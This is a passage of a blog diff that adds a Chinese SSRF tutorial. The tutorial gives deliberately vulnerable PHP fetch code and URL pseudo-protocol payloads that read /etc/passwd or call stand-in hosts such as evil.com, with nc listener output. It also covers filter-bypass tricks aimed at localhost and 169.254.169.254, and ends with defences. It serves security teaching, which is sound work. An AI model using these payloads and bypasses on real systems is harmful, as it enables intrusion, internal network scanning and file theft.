+<p>2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p>
+<p>3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p>
+<p><img src="/.com//image-20250520025709-vdxc2ye.png" alt="image"></p>
+<p>4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p>
+</blockquote>
+<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
+<p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p>
+<p><img src="/.com//image-20250520025722-dq5eksz.png" alt="image"></p>
+<p>6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p>
+<p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p>
+<p>7、从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞</p>
+<blockquote>
+<p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p>
+</blockquote>
+<p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p>
+<hr>
+<h2 id="四、产生SSRF漏洞的函数"><a href="#四、产生SSRF漏洞的函数" class="headerlink" title="四、产生SSRF漏洞的函数"></a>四、产生SSRF漏洞的函数</h2><p>SSRF攻击可能存在任何语言编写的应用，接下来将举例&#x3D;&#x3D;php&#x3D;&#x3D;中可能存在SSRF漏洞的函数。</p>
+<p><strong>1、file_get_contents:</strong></p>
+<p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line">file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$img</span>; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、sockopen():</strong></p>
+<p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">function</span> GetFile(<span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span>) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$errstr</span> (error number <span class="variable">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose(<span class="variable">$fp</span>); </span><br><span class="line"><span class="built_in">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、curl_exec():</strong></p>
+<p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意事项</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">curl_exec() 默认不跟踪跳转，</span><br><span class="line">file_get_contents() file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、SSRF中URL的伪协议"><a href="#五、SSRF中URL的伪协议" class="headerlink" title="五、SSRF中URL的伪协议"></a>五、SSRF中URL的伪协议</h2><p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure>
+
+<p><strong>1、file</strong></p>
+<p>这种URL Schema可以尝试从文件系统中获取文件：</p>
+<blockquote>
+<p><a href="http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini">http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p>
+</blockquote>
+<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
+<p><strong>2、dict</strong></p>
+<p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>3、sftp</strong></p>
+<p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>4、ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;</strong></p>
+<p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>5、tftp:&#x2F;&#x2F;</strong></p>
+<p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>6、gopher:&#x2F;&#x2F;</strong></p>
+<p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);?&gt;</span><br><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure></blockquote>
+<hr>
+<h2 id="六、SSRF漏洞利用（危害）"><a href="#六、SSRF漏洞利用（危害）" class="headerlink" title="六、SSRF漏洞利用（危害）"></a>六、SSRF漏洞利用（危害）</h2><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
+<p>5.利用file协议读取本地文件等。.</p>
+<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
+<p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
+<hr>
+<h2 id="七、SSRF绕过方式"><a href="#七、SSRF绕过方式" class="headerlink" title="七、SSRF绕过方式"></a>七、SSRF绕过方式</h2><p><strong>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</strong></p>
+<p>一、常见的绕过方式</p>
+<p><strong>1、限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以尝试采用http基本身份认证的方式绕过</span><br><span class="line">如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</span><br><span class="line">在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>2.采用短网址绕过</strong></p>
+<blockquote>
+<p>比如百度短地址<a target="_blank" rel="noopener" href="https://dwz.cn/">https://dwz.cn/</a></p>
+</blockquote>
+<p><strong>3.采用进制转换</strong></p>
+<blockquote>
+<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
+</blockquote>
+<p><img src="/.com//image-20250520030023-ukm1uls.png" alt="image"></p>
+<p><strong>4.利用特殊域名</strong></p>
+<blockquote>
+<p>原理是DNS解析。<strong>xip.io</strong>可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
+</blockquote>
+<p><strong>5.利用[::]</strong></p>
+<blockquote>
+<p>可以利用[::]来绕过localhost<br><a target="_blank" rel="noopener" href="http://169.254.169.254/%3E/%3Ehttp://[::169.254.169.254]">http://169.254.169.254\&gt;\&gt;http://[::169.254.169.254]</a></p>
+</blockquote>
+<p><strong>6.利用句号</strong></p>
+<blockquote>
+<p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
+</blockquote>
+<p><strong>7、CRLF 编码绕过</strong></p>
+<blockquote>
+<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </span><br></pre></td></tr></table></figure>
+
+<p><strong>8.利用封闭的字母数字</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com</span><br><span class="line">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ</span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴</span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
+
+<p>二、常见限制</p>
+<p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
+<blockquote>
+<p>采用http基本身份认证的方式绕过，即@<br><a target="_blank" rel="noopener" href="http://www.xxx.com@www.xxc.com/">http://www.xxx.com@www.xxc.com</a></p>
+</blockquote>
+<p>2.限制请求IP不为内网地址</p>
+<blockquote>
+<p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p>
+</blockquote>
+<p>3.限制请求只为http协议</p>
+<blockquote>
+<p>（1）采取302跳转<br>（2）采取短地址</p>
+</blockquote>
+<hr>
+<h2 id="八、SSRF漏防御"><a href="#八、SSRF漏防御" class="headerlink" title="八、SSRF漏防御"></a>八、SSRF漏防御</h2><p>通常有以下5个思路：</p>
+<p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
+<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
+<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/SSRF/" data-id="cmawck7hl0006rk7khjeua66e" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1114,7 +1406,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" data-id="cmawcfx8y0006cg7ke1z9hmx0" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" data-id="cmawck7hn0009rk7kf2vjdt3m" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1209,36 +1501,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmawcfx8y0007cg7kebhc5ayo" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/工具使用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45300786/article/details/121588890">工具总结</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="cmawcfx8z000acg7k1xil56e8" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmawck7ho000drk7k4y0f35qd" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
